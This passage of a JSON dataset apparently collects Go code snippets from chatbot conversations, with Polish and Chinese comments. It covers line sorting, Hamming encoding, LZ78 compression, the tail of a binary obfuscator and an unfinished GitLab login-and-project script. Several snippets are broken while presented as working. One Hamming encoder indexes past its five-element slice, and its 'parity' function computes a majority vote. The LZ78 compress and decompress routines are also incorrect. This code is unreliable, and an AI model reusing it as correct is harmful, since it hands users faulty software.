err)\n\t}\n\n\tfmt.Println(\"Obfuscated binary created: obfuscated-binary\")\n\n\treturn nil\n}\n\nfunc main() {\n\t// Replace 'path/to/your/binary' with the actual binary file path\n\terr := obfuscateBinary(\"path/to/your/binary\")\n\tif err != nil {\n\t\tfmt.Println(\"Error:\", err)\n\t\tos.Exit(1)\n\t}\n}",
    "filename": "2641924ae0397e8950fbe4892bf4f76e_1.go"
  },
  {
    "conversation_hash": "80e0190b21cd8b9f616fd0e267ba7834",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n)\n\nfunc main() {\n\t// Wczytaj tekst z pliku\n\tfile, err := os.Open(\"input.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas otwierania pliku:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\tscanner := bufio.NewScanner(file)\n\tlines := []string{} // Przechowuje wczytane linie\n\n\tfor scanner.Scan() {\n\t\tline := scanner.Text()\n\t\tlines = append(lines, line)\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\tfmt.Println(\"Błąd podczas skanowania pliku:\", err)\n\t\treturn\n\t}\n\n\t// Sortuj linie\n\tsort.Strings(lines)\n\n\t// Zapisz posortowany tekst do pliku\n\toutputFile, err := os.Create(\"output.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas tworzenia pliku:\", err)\n\t\treturn\n\t}\n\tdefer outputFile.Close()\n\n\twriter := bufio.NewWriter(outputFile)\n\tfor _, line := range lines {\n\t\t_, err := writer.WriteString(line + \"\\n\")\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas zapisywania do pliku:\", err)\n\t\t\treturn\n\t\t}\n\t}\n\n\twriter.Flush()\n\tfmt.Println(\"Wynik został zapisany do pliku output.txt.\")\n}",
    "filename": "80e0190b21cd8b9f616fd0e267ba7834_0.go"
  },
  {
    "conversation_hash": "80e0190b21cd8b9f616fd0e267ba7834",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n\t\"strings\"\n)\n\nfunc main() {\n\t// Wczytaj tekst z pliku\n\tfile, err := os.Open(\"input.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas otwierania pliku:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\tscanner := bufio.NewScanner(file)\n\tlines := make(map[rune][]string) // Przechowuje posortowane linie dla każdego symbolu\n\n\tfor scanner.Scan() {\n\t\tline := scanner.Text()\n\t\tfirstChar := []rune(line)[0] // Pobierz pierwszy symbol z linii\n\n\t\t// Dodaj aktualną linie do odpowiedniego symbolu w mapie\n\t\tlines[firstChar] = append(lines[firstChar], line)\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\tfmt.Println(\"Błąd podczas skanowania pliku:\", err)\n\t\treturn\n\t}\n\n\t// Sortuj i zapisz wynik do pliku\n\toutputFile, err := os.Create(\"output.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas tworzenia pliku:\", err)\n\t\treturn\n\t}\n\tdefer outputFile.Close()\n\n\twriter := bufio.NewWriter(outputFile)\n\tkeys := make([]string, 0, len(lines))\n\tfor key := range lines {\n\t\tkeys = append(keys, string(key))\n\t}\n\tsort.Strings(keys)\n\n\tfor _, key := range keys {\n\t\t_, err := writer.WriteString(strings.Join(lines[rune(key)], \"\\n\") + \"\\n\")\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas zapisywania do pliku:\", err)\n\t\t\treturn\n\t\t}\n\t}\n\n\twriter.Flush()\n\tfmt.Println(\"Wynik został zapisany do pliku output.txt.\")\n}",
    "filename": "80e0190b21cd8b9f616fd0e267ba7834_1.go"
  },
  {
    "conversation_hash": "80e0190b21cd8b9f616fd0e267ba7834",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n\t\"strings\"\n)\n\nfunc main() {\n\t// Wczytaj tekst z pliku\n\tfile, err := os.Open(\"input.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas otwierania pliku:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\tscanner := bufio.NewScanner(file)\n\tlines := make(map[string][]string) // Przechowuje posortowane linie dla każdego symbolu\n\n\tfor scanner.Scan() {\n\t\tline := scanner.Text()\n\t\tfirstChar := string(line[0]) // Pobierz pierwszy symbol z linii\n\n\t\t// Dodaj aktualną linie do odpowiedniego symbolu w mapie\n\t\tlines[firstChar] = append(lines[firstChar], line)\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\tfmt.Println(\"Błąd podczas skanowania pliku:\", err)\n\t\treturn\n\t}\n\n\t// Sortuj i zapisz wynik do pliku\n\toutputFile, err := os.Create(\"output.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas tworzenia pliku:\", err)\n\t\treturn\n\t}\n\tdefer outputFile.Close()\n\n\twriter := bufio.NewWriter(outputFile)\n\tkeys := make([]string, 0, len(lines))\n\tfor key := range lines {\n\t\tkeys = append(keys, key)\n\t}\n\tsort.Strings(keys)\n\n\tfor _, key := range keys {\n\t\t_, err := writer.WriteString(strings.Join(lines[key], \"\\n\") + \"\\n\")\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas zapisywania do pliku:\", err)\n\t\t\treturn\n\t\t}\n\t}\n\n\twriter.Flush()\n\tfmt.Println(\"Wynik został zapisany do pliku output.txt.\")\n}",
    "filename": "80e0190b21cd8b9f616fd0e267ba7834_2.go"
  },
  {
    "conversation_hash": "80e0190b21cd8b9f616fd0e267ba7834",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n\t\"strings\"\n)\n\nfunc main() {\n\t// Wczytaj tekst z pliku\n\tfile, err := os.Open(\"input.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas otwierania pliku:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\tscanner := bufio.NewScanner(file)\n\n\tlines := make(map[string][]string) // Przechowuje posortowane linie dla każdego symbolu\n\n\tfor scanner.Scan() {\n\t\tline := scanner.Text()\n\n\t\t// Jeśli linia jest pusta, przejdź do następnej\n\t\tif len(line) == 0 {\n\t\t\tcontinue\n\t\t}\n\n\t\tfirstChar := string(line[0]) // Pobierz pierwszy symbol z linii\n\n\t\t// Dodaj aktualną linie do odpowiedniego symbolu w mapie\n\t\tlines[firstChar] = append(lines[firstChar], line)\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\tfmt.Println(\"Błąd podczas skanowania pliku:\", err)\n\t\treturn\n\t}\n\n\t// Sortuj i zapisz wynik do pliku\n\toutputFile, err := os.Create(\"output.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas tworzenia pliku:\", err)\n\t\treturn\n\t}\n\tdefer outputFile.Close()\n\n\twriter := bufio.NewWriter(outputFile)\n\tkeys := make([]string, 0, len(lines))\n\tfor key := range lines {\n\t\tkeys = append(keys, key)\n\t}\n\tsort.Strings(keys)\n\n\tfor _, key := range keys {\n\t\t_, err := writer.WriteString(strings.Join(lines[key], \"\\n\") + \"\\n\")\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas zapisywania do pliku:\", err)\n\t\t\treturn\n\t\t}\n\t}\n\n\twriter.Flush()\n\tfmt.Println(\"Wynik został zapisany do pliku output.txt.\")\n}",
    "filename": "80e0190b21cd8b9f616fd0e267ba7834_3.go"
  },
  {
    "conversation_hash": "e7351fe72612793b60e5c638074ee3fa",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"strings\"\n)\n\nfunc main() {\n\t// Odczytaj tekst z pliku wejściowego\n\tinput, err := ioutil.ReadFile(\"input.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Błąd odczytu pliku wejściowego:\", err)\n\t\treturn\n\t}\n\n\t// Usuń białe znaki i podziel na 3-znakowe bloki\n\ttext := strings.ReplaceAll(string(input), \" \", \"\")\n\tblocks := splitIntoBlocks(text, 3)\n\n\t// Zamień każdy blok na jego kod Hamminga\n\tvar encodedBlocks []string\n\tfor _, block := range blocks {\n\t\tencodedBlock := hammingEncode(block)\n\t\tencodedBlocks = append(encodedBlocks, encodedBlock)\n\t}\n\n\t// Zapisz zakodowane bloki do pliku wyjściowego\n\toutput := strings.Join(encodedBlocks, \"\")\n\terr = ioutil.WriteFile(\"output.txt\", []byte(output), 0644)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd zapisu pliku wyjściowego:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"Konwersja zakończona pomyślnie.\")\n}\n\n// Funkcja pomocnicza do podziału tekstu na bloki\nfunc splitIntoBlocks(text string, blockSize int) []string {\n\tvar blocks []string\n\tfor i := 0; i < len(text); i += blockSize {\n\t\tend := i + blockSize\n\t\tif end > len(text) {\n\t\t\tend = len(text)\n\t\t}\n\t\tblock := text[i:end]\n\t\tblocks = append(blocks, block)\n\t}\n\treturn blocks\n}\n\n// Funkcja do kodowania bloku za pomocą algorytmu Hamminga\nfunc hammingEncode(block string) string {\n\tbits := []int{0, 0, 0, 0, 0}\n\n\t// Mapa bitów do odpowiednich pozycji w bloku\n\tbitMap := map[int]int{\n\t\t0: 2,\n\t\t1: 4,\n\t\t2: 5,\n\t\t3: 6,\n\t}\n\n\t// Ustawienie bitów parzystości w bloku\n\tfor i, char := range block {\n\t\tif char == '1' {\n\t\t\tbits[bitMap[i]] = 1\n\t\t}\n\t}\n\n\t// Obliczanie bitów kontrolnych\n\tbits[0] = parityBit(bits[2], bits[4], bits[6])\n\tbits[1] = parityBit(bits[2], bits[5], bits[6])\n\tbits[3] = parityBit(bits[4], bits[5], bits[6])\n\n\t// Konwersja bitów do postaci tekstowej\n\tvar encodedBlock string\n\tfor _, bit := range bits {\n\t\tencodedBlock += fmt.Sprintf(\"%d\", bit)\n\t}\n\n\treturn encodedBlock\n}\n\n// Funkcja pomocnicza do obliczania bitu parzystości\nfunc parityBit(a, b, c int) int {\n\tif a+b+c >= 2 {\n\t\treturn 1\n\t}\n\treturn 0\n}",
    "filename": "e7351fe72612793b60e5c638074ee3fa_0.go"
  },
  {
    "conversation_hash": "00803f3fbf2ef1722db23fc9daabe553",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc hammingDistance(s1, s2 string) int {\n\tif len(s1) != len(s2) {\n\t\treturn -1\n\t}\n\n\tdistance := 0\n\tfor i := 0; i < len(s1); i++ {\n\t\tif s1[i] != s2[i] {\n\t\t\tdistance++\n\t\t}\n\t}\n\n\treturn distance\n}\n\nfunc hammingCode(input string) string {\n\tcode := \"\"\n\n\tfor i := 0; i < len(input); i++ {\n\t\tascii := int(input[i])\n\t\tbinary := fmt.Sprintf(\"%08b\", ascii)\n\t\tredundantBits := 0\n\t\tj := 0\n\n\t\tfor j < len(binary) {\n\t\t\tcode += string(binary[j])\n\t\t\tif isPowerOfTwo(j+1) {\n\t\t\t\tredundantBits++\n\t\t\t} else {\n\t\t\t\tcode += string(binary[j])\n\t\t\t}\n\t\t\tj++\n\t\t}\n\n\t\tfor k := 0; k < redundantBits; k++ {\n\t\t\tsum := 0\n\t\t\tfor l := 1; l <= len(code); l++ {\n\t\t\t\tbit := code[l-1]\n\t\t\t\tif bit == '1' && (l&(1<<k) != 0) {\n\t\t\t\t\tsum++\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tparityBit := '0'\n\t\t\tif sum%2 != 0 {\n\t\t\t\tparityBit = '1'\n\t\t\t}\n\n\t\t\tcode = code[:len(code)-(1<<k)] + string(parityBit) + code[len(code)-(1<<k):]\n\t\t}\n\t}\n\n\treturn code\n}\n\nfunc isPowerOfTwo(num int) bool {\n\treturn num&(num-1) == 0\n}\n\nfunc main() {\n\t// Wczytaj zawartość pliku tekstowego\n\tfilePath := \"input.txt\"\n\tdata, err := ioutil.ReadFile(filePath)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd odczytu pliku:\", err)\n\t\tos.Exit(1)\n\t}\n\n\t// Przekonwertuj zawartość na string\n\ttext := string(data)\n\n\t// Generuj kod Hamminga dla tekstu\n\tcode := hammingCode(text)\n\n\t// Zapisz kod do pliku\n\toutputPath := \"output.txt\"\n\terr = ioutil.WriteFile(outputPath, []byte(code), 0644)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd zapisu do pliku:\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Println(\"Kod Hamminga został zapisany do pliku\", outputPath)\n}",
    "filename": "00803f3fbf2ef1722db23fc9daabe553_0.go"
  },
  {
    "conversation_hash": "09ff2359b17ffd04152a8f09978aa0e0",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"math/big\"\n)\n\nfunc main() {\n\tx := big.NewInt(1234567890)\n\ty := big.NewInt(987654321)\n\tz := big.NewInt(0)\n\n\tz.Add(x, y)\n\tfmt.Println(z.String())\n\n\tz.Sub(x, y)\n\tfmt.Println(z.String())\n\n\tz.Mul(x, y)\n\tfmt.Println(z.String())\n\n\tz.Div(x, y)\n\tfmt.Println(z.String())\n}",
    "filename": "09ff2359b17ffd04152a8f09978aa0e0_0.go"
  },
  {
    "conversation_hash": "09ff2359b17ffd04152a8f09978aa0e0",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tbytes := []byte{3, 5, 29}\n\tfmt.Println(bytes)\n}",
    "filename": "09ff2359b17ffd04152a8f09978aa0e0_17.go"
  },
  {
    "conversation_hash": "a44e89498008338962b5e02ee50e9c73",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\ntype DictionaryEntry struct {\n\tPrefix   uint32\n\tSuffix   byte\n\tNextCode uint32\n}\n\nfunc Compress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejściowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make([]DictionaryEntry, 256)\n\n\t// Zainicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// Zmienna pomocnicza\n\tprefix := uint32(0)\n\n\t// Iteruj po każdym bajcie danych wejściowych\n\tfor _, symbol := range inputData {\n\t\tsuffix := symbol // Aktualny sufiks to aktualny symbol\n\n\t\t// Szukaj w słowniku kombinacji prefiksu i sufiksu\n\t\tfor dictionary[prefix].Suffix != 0 && dictionary[prefix].Suffix != suffix {\n\t\t\tprefix = dictionary[prefix].NextCode\n\t\t}\n\n\t\t// Jeśli kombinacja istnieje w słowniku, przesuń się do jej indeksu\n\t\tif dictionary[prefix].Suffix == suffix {\n\t\t\tprefix = dictionary[prefix].NextCode\n\t\t} else {\n\t\t\t// W przeciwnym razie dodaj nową kombinację do słownika\n\t\t\tdictionary[prefix].Suffix = suffix\n\t\t\tdictionary[prefix].NextCode = uint32(len(dictionary))\n\t\t\tbinary.Write(&result, binary.LittleEndian, prefix)\n\t\t\tbinary.Write(&result, binary.LittleEndian, suffix)\n\t\t\tprefix = uint32(suffix)\n\t\t}\n\t}\n\n\t// Zapisz wynik do pliku wyjściowego\n\toutputFile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer outputFile.Close()\n\n\t_, err = outputFile.Write(result.Bytes())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc Decompress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj skompresowany plik wejściowy\n\tcompressedData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make([]DictionaryEntry, 256)\n\n\t// Zainicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// Wczytaj skompresowane dane na przemian w pary prefiks-sufiks\n\tfor i := 0; i < len(compressedData); i += 5 {\n\t\tvar prefix uint32\n\t\tvar suffix byte\n\n\t\t// Wczytaj prefiks\n\t\terr = binary.Read(bytes.NewReader(compressedData[i:(i+4)]), binary.LittleEndian, &prefix)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\t// Jeśli prefiks jest spoza słownika, zdekoduj dane na podstawie ostatnio wczytanego sufiksu\n\t\tif prefix >= uint32(len(dictionary)) {\n\t\t\tprefix = uint32(result.Bytes()[len(result.Bytes())-1])\n\t\t\tsuffix = compressedData[i+4]\n\t\t} else {\n\t\t\t// W przeciwnym razie wczytaj sufiks\n\t\t\tsuffix = compressedData[i+4]\n\t\t}\n\n\t\t// Dodaj zdekodowany symbol do wynikowego bufora\n\t\tresult.WriteByte(suffix)\n\n\t\t// Dodaj nową kombinację do słownika\n\t\tdictionary = append(dictionary, DictionaryEntry{\n\t\t\tPrefix:   prefix,\n\t\t\tSuffix:   suffix,\n\t\t\tNextCode: uint32(len(dictionary)),\n\t\t})\n\t}\n\n\t// Zapisz wynik do pliku wyjściowego\n\toutputFile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer outputFile.Close()\n\n\t_, err = outputFile.Write(result.Bytes())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\t// Nazwy plików wejściowego i wyjściowego\n\tinputFile := \"input.txt\"\n\tcompressedFile := \"compressed.lz78\"\n\tdecompressedFile := \"decompressed.txt\"\n\n\t// Kompresuj plik wejściowy\n\terr := Compress(inputFile, compressedFile)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas kompresowania pliku:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"Plik został skompresowany do:\", compressedFile)\n\n\t// Dekompresuj plik skompresowany\n\terr = Decompress(compressedFile, decompressedFile)\n\tif err != nil {\n\t\tfmt.Println(\"Błąd podczas dekompresowania pliku:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"Plik został zdekompresowany do:\", decompressedFile)\n}",
    "filename": "a44e89498008338962b5e02ee50e9c73_0.go"
  },
  {
    "conversation_hash": "a44e89498008338962b5e02ee50e9c73",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\ntype DictionaryEntry struct {\n\tPrefix   uint32\n\tSuffix   byte\n\tNextCode uint32\n}\n\nfunc Compress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejściowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make([]DictionaryEntry, 256)\n\n\t// Zainicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// Zmienna pomocnicza\n\tprefix := uint32(0)\n\n\t// Iteruj po każdym bajcie danych wejściowych\n\tfor _, symbol := range inputData {\n\t\tsuffix := symbol // Aktualny sufiks to aktualny symbol\n\n\t\t// Szukaj w słowniku kombinacji prefiksu i sufiksu\n\t\tfor dictionary[prefix].Suffix != 0 && dictionary[prefix].Suffix != suffix {\n\t\t\tprefix = dictionary[prefix].NextCode\n\t\t}\n\n\t\t// Jeśli kombinacja istnieje w słowniku, przesuń się do jej indeksu\n\t\tif dictionary[prefix].Suffix == suffix {\n\t\t\tprefix = dictionary[prefix].NextCode\n\t\t} else {\n\t\t\t// W przeciwnym razie dodaj nową kombinację do słownika\n\t\t\tdictionary[prefix].Suffix = suffix\n\t\t\tdictionary[prefix].NextCode = uint32(len(dictionary))\n\t\t\tbinary.Write(&result, binary.LittleEndian, prefix)\n\t\t\tbinary.Write(&result, binary.LittleEndian, suffix)\n\t\t\tprefix = uint32(suffix)\n\t\t}\n\t}\n\n\t// Zapisz wynik do pliku wyjściowego\n\toutputFile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer outputFile.Close()\n\n\t_, err = outputFile.Write(result.Bytes())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\t// Pobierz argumenty z wiersza poleceń\n\targs := os.Args[1:]\n\n\tif len(args) != 3 || (args[0] != \"-c\" && args[0] != \"-d\") {\n\t\tfmt.Println(\"Sposób użycia: lz78 -c/-d plik_wejsciowy plik_wyjsciowy\")\n\t\treturn\n\t}\n\n\toperation := args[0]\n\tinputFile := args[1]\n\toutputFile := args[2]\n\n\tswitch operation {\n\tcase \"-c\":\n\t\terr := Compress(inputFile, outputFile)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas kompresowania pliku:\", err)\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(\"Plik został skompresowany do:\", outputFile)\n\tcase \"-d\":\n\t\t// Dekodowanie jeszcze nie zostało zaimplementowane\n\t\tfmt.Println(\"Dekodowanie nie jest jeszcze zaimplementowane\")\n\tdefault:\n\t\tfmt.Println(\"Nieznane działanie:\", operation)\n\t}\n}",
    "filename": "a44e89498008338962b5e02ee50e9c73_1.go"
  },
  {
    "conversation_hash": "a44e89498008338962b5e02ee50e9c73",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\ntype DictionaryEntry struct {\n\tPrefix   uint32\n\tSuffix   byte\n\tNextCode uint32\n}\n\nfunc Compress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj plik wejściowy\n\tinputData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make([]DictionaryEntry, 256)\n\n\t// Zainicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// Zmienna pomocnicza\n\tprefix := uint32(0)\n\n\t// Iteruj po każdym bajcie danych wejściowych\n\tfor _, symbol := range inputData {\n\t\tsuffix := symbol // Aktualny sufiks to aktualny symbol\n\n\t\t// Szukaj w słowniku kombinacji prefiksu i sufiksu\n\t\tfor dictionary[prefix].Suffix != 0 && dictionary[prefix].Suffix != suffix {\n\t\t\tprefix = dictionary[prefix].NextCode\n\t\t}\n\n\t\t// Jeśli kombinacja istnieje w słowniku, przesuń się do jej indeksu\n\t\tif dictionary[prefix].Suffix == suffix {\n\t\t\tprefix = dictionary[prefix].NextCode\n\t\t} else {\n\t\t\t// W przeciwnym razie dodaj nową kombinację do słownika\n\t\t\tdictionary[prefix].Suffix = suffix\n\t\t\tdictionary[prefix].NextCode = uint32(len(dictionary))\n\t\t\tbinary.Write(&result, binary.LittleEndian, prefix)\n\t\t\tbinary.Write(&result, binary.LittleEndian, suffix)\n\t\t\tprefix = uint32(suffix)\n\t\t}\n\t}\n\n\t// Zapisz wynik do pliku wyjściowego\n\toutputFile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer outputFile.Close()\n\n\t_, err = outputFile.Write(result.Bytes())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc Decompress(inputFilePath, outputFilePath string) error {\n\t// Odczytaj skompresowany plik wejściowy\n\tcompressedData, err := ioutil.ReadFile(inputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\n\t// Inicjalizuj słownik\n\tdictionary := make([]DictionaryEntry, 256)\n\n\t// Zainicjalizuj wynikowy bufor\n\tvar result bytes.Buffer\n\n\t// Wczytaj skompresowane dane na przemian w pary prefiks-sufiks\n\tfor i := 0; i < len(compressedData); i += 5 {\n\t\tvar prefix uint32\n\t\tvar suffix byte\n\n\t\t// Wczytaj prefiks\n\t\terr = binary.Read(bytes.NewReader(compressedData[i:(i+4)]), binary.LittleEndian, &prefix)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\t// Jeśli prefiks jest spoza słownika, zdekoduj dane na podstawie ostatnio wczytanego sufiksu\n\t\tif prefix >= uint32(len(dictionary)) {\n\t\t\tprefix = uint32(result.Bytes()[len(result.Bytes())-1])\n\t\t\tsuffix = compressedData[i+4]\n\t\t} else {\n\t\t\t// W przeciwnym razie wczytaj sufiks\n\t\t\tsuffix = compressedData[i+4]\n\t\t}\n\n\t\t// Dodaj zdekodowany symbol do wynikowego bufora\n\t\tresult.WriteByte(suffix)\n\n\t\t// Dodaj nową kombinację do słownika\n\t\tdictionary = append(dictionary, DictionaryEntry{\n\t\t\tPrefix:   prefix,\n\t\t\tSuffix:   suffix,\n\t\t\tNextCode: uint32(len(dictionary)),\n\t\t})\n\t}\n\n\t// Zapisz wynik do pliku wyjściowego\n\toutputFile, err := os.Create(outputFilePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer outputFile.Close()\n\n\t_, err = outputFile.Write(result.Bytes())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\t// Pobierz argumenty z wiersza poleceń\n\targs := os.Args[1:]\n\n\tif len(args) != 3 || (args[0] != \"-c\" && args[0] != \"-d\") {\n\t\tfmt.Println(\"Sposób użycia: lz78 -c/-d plik_wejsciowy plik_wyjsciowy\")\n\t\treturn\n\t}\n\n\toperation := args[0]\n\tinputFile := args[1]\n\toutputFile := args[2]\n\n\tswitch operation {\n\tcase \"-c\":\n\t\terr := Compress(inputFile, outputFile)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas kompresowania pliku:\", err)\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(\"Plik został skompresowany do:\", outputFile)\n\tcase \"-d\":\n\t\terr := Decompress(inputFile, outputFile)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Błąd podczas dekompresowania pliku:\", err)\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(\"Plik został zdekompresowany do:\", outputFile)\n\tdefault:\n\t\tfmt.Println(\"Nieznane działanie:\", operation)\n\t}\n}",
    "filename": "a44e89498008338962b5e02ee50e9c73_2.go"
  },
  {
    "conversation_hash": "b9e6ceed859f158f4f41898f5e3bf47f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nfunc main() {\n\tbaseURL := os.Args[1]\n\tif strings.HasPrefix(baseURL, \"http://\") || strings.HasPrefix(baseURL, \"https://\") {\n\t\t// do nothing\n\t} else {\n\t\tfmt.Println(\"[-] Include http:// or https:// in the URL!\")\n\t\tos.Exit(1)\n\t}\n\tif strings.HasSuffix(baseURL, \"/\") {\n\t\tbaseURL = baseURL[:len(baseURL)-1]\n\t}\n\n\t// 继续写下面的代码逻辑\n\t// ...\n}",
    "filename": "b9e6ceed859f158f4f41898f5e3bf47f_0.go"
  },
  {
    "conversation_hash": "b9e6ceed859f158f4f41898f5e3bf47f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n\t\"net/http\"\n)\n\nfunc main() {\n\tbaseURL := os.Args[1]\n\tif strings.HasPrefix(baseURL, \"http://\") || strings.HasPrefix(baseURL, \"https://\") {\n\t\t// do nothing\n\t} else {\n\t\tfmt.Println(\"[-] Include http:// or https:// in the URL!\")\n\t\tos.Exit(1)\n\t}\n\tif strings.HasSuffix(baseURL, \"/\") {\n\t\tbaseURL = baseURL[:len(baseURL)-1]\n\t}\n\n\tusername := strings.Split(os.Args[2], \"@\")[0]\n\tpassword := os.Args[3]\n\n\tloginURL := baseURL + \"/users/sign_in\"\n\tprojectURL := baseURL + \"/projects/new\"\n\tcreateURL := baseURL + \"/projects\"\n\tprevIssueURL := \"\"\n\tcsrfToken := \"\"\n\tprojectNames := []string{\"ProjectOne\", \"ProjectTwo\"}\n\n\tsession := &http.Client{}\n\n\t// 继续写下面的代码逻辑\n\t// ...\n}",
    "filename": "b9e6ceed859f158f4f41898f5e3bf47f_1.go"
  },
  {
    "conversation_hash": "8f02eaa37c58ecbdcc4fd1739af3e71f",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Szukaj w słowniku kombinacji prefiksu i sufiksu\nentry, exists := dictionary[prefix]\nfor exists && entry.Suffix != suffix {\n  prefix = entry.NextCode\n  entry, exists = dictionary[prefix]\n}\n\n// Jeśli kombinacja istnieje w słowniku, przejdź do jej indeksu\nif exists && entry.Suffix == suffix {\n  prefix = entry.NextCode\n} else {\n  // W przeciwnym razie dodaj nową kombinację do słownika\n  dictionary[prefix] = DictionaryEntry{Suffix: suffix, NextCode: uint32(len(dictionary))}\n  prefix = uint32(suffix)\n}",
    "filename": "8f02eaa37c58ecbdcc4fd1739af3e71f_2.go"
  },
  {
    "conversation_hash": "b10ab4a472d5e3595218ff4b7a1e763a",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
